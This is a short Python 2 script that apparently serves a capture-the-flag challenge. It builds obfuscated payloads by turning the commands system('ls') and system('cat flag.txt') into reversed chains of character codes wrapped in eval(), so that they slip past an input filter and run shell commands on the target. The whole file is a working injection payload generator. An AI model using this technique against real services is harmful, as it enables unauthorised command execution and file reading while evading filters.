d1 = "system('ls')"
d2 = "system('cat flag.txt')"

key = ''
key += ''.join(str(ord(i)) + ".chr+" for i in d1)
key = "eval(" + key[:-1] + ")"
print d1 + " >> " + key[::-1]

key = ''
key += ''.join(str(ord(i)) + ".chr+" for i in d2)
key = "eval(" + key[:-1] + ")"
print d2 + " >> " + key[::-1]
